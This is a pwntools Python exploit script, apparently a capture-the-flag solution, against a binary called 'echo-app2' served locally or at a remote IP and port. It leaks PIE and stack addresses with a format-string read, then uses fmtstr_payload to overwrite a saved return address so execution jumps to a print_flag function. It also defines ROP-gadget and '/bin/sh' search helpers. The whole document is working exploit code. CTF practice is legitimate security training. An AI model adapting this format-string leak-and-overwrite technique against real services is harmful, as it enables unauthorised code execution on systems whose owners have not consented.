from pwn import *
from icecream import ic

elf = exe = ELF("./echo-app2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("54.85.45.101", 8009)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *do_echo+385
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop=True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

if args.REMOTE:
    sl(b'%42$p.%47$p.')
    elf.address = int(ru(".").strip(), 16) - elf.sym['main']
    stack = int(ru(".").strip(), 16) - 0x130 + 0x10
    sl(fmtstr_payload(6, writes = {stack : elf.address + 0x000000000000101a, stack+8 : elf.sym["print_flag"]}))
else:
    sl(b'%42$p.%48$p.')
    elf.address = int(ru(".").strip(), 16) - elf.sym['main']
    stack = int(ru(".").strip(), 16) - 0x130
    sl(fmtstr_payload(6, {stack : elf.sym["print_flag"]}))

# sl(fmtstr_payload(6, {stack + 0x48 + 0x48: 0}))
io.interactive()
